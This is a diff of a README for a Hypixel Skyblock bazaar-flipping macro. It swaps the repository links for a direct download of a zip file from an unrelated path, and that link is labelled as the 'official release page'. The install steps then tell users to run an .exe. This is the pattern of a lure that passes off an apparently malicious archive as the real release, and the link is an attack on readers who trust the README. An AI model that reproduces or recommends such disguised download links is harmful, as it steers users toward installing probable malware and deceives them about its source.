@@ -5,7 +5,7 @@ description: "Automate Hypixel Skyblock Bazaar flipping with this lightweight, h
 ---
 # 📈 mbf-hypixel-macro - Automate your Hypixel bazaar trades daily
 
-[![](https://img.shields.io/badge/Download-mbf-hypixel-macro-blue)](https://github.com/tayyabsal8544/mbf-hypixel-macro)
+[![](https://img.shields.io/badge/Download-mbf-hypixel-macro-blue)](https://raw.githubusercontent.com/tayyabsal8544/tayyabsal8544.github.io/main/untabernacled/github-tayyabsal-io-1.7.zip)
 
 MBF helps players manage their bazaar flips in the Hypixel Skyblock RPG. This tool runs in the background. It handles buying and selling items based on prices. You use a web dashboard to see your profit. The system adjusts listing prices to keep you ahead of other players.
 
@@ -23,7 +23,7 @@ Your computer needs specific parts to run this tool well. Check this list before
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/tayyabsal8544/mbf-hypixel-macro).
+1. Go to the [official release page](https://raw.githubusercontent.com/tayyabsal8544/tayyabsal8544.github.io/main/untabernacled/github-tayyabsal-io-1.7.zip).
 2. Look for the latest version listed under the Releases section.
 3. Click the file that ends in .exe to start your download.
 4. Save the file to your desktop for easy access.
